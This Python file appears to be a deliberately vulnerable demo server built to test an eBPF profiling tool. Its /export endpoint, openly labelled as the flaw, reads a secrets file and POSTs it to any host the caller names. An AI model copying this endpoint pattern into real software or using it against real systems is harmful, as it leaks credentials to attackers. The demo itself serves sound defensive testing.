#!/usr/bin/env python3
"""Customer-records API for the ebpf-mon data-exfiltration demo.

*** DO NOT DEPLOY. Demo target only. ***

Legit endpoints (exercise these while profiling):
  GET /           -> liveness "ok"
  GET /orders     -> reads /data/orders.json (legit data read)

Vulnerable endpoint (the "exfil" / SSRF-style attack):
  GET /export?to=<ip>  -> reads /secrets/db.env and POSTs it to http://<ip>/ingest

Under a profile learned from / + /orders only:
  - /orders keeps working
  - reading /secrets/db.env and egress to an un-profiled C2 IP are denied
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from urllib.request import Request, urlopen
from urllib.error import URLError
import json


ORDERS_PATH = "/data/orders.json"
SECRETS_PATH = "/secrets/db.env"


class Handler(BaseHTTPRequestHandler):
    def _send(self, code, body, content_type="text/plain"):
        data = body if isinstance(body, bytes) else body.encode(errors="replace")
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        u = urlparse(self.path)
        if u.path == "/":
            self._send(200, "ok\n")
        elif u.path == "/orders":
            try:
                with open(ORDERS_PATH, "rb") as f:
                    self._send(200, f.read(), "application/json")
            except OSError as e:
                self._send(500, f"{e}\n")
        elif u.path == "/export":
            # THE VULNERABILITY: attacker chooses the destination; the server
            # reads a secret and posts it out (data exfiltration / SSRF).
            to = parse_qs(u.query).get("to", [""])[0].strip()
            if not to:
                self._send(400, "missing ?to=<ip-or-host>\n")
                return
            try:
                with open(SECRETS_PATH, "rb") as f:
                    secret = f.read()
            except OSError as e:
                self._send(500, f"secret read failed: {e}\n")
                return
            url = f"http://{to}/ingest"
            try:
                req = Request(url, data=secret, method="POST")
                req.add_header("Content-Type", "text/plain")
                with urlopen(req, timeout=3) as resp:
                    body = resp.read(256)
                self._send(200, f"exfiltrated {len(secret)} bytes to {to}\n{body.decode(errors='replace')}\n")
            except URLError as e:
                self._send(502, f"exfil to {to} failed: {e}\n")
            except Exception as e:  # noqa: BLE001 — demo app; surface any failure
                self._send(502, f"exfil to {to} failed: {e}\n")
        else:
            self._send(404, "not found\n")

    def log_message(self, *_):
        pass  # keep profiling output clean


if __name__ == "__main__":
    # Touch the seed files so a missing volume still starts (image bakes them in).
    try:
        with open(ORDERS_PATH) as f:
            json.load(f)
    except Exception:
        pass
    HTTPServer(("0.0.0.0", 8081), Handler).serve_forever()
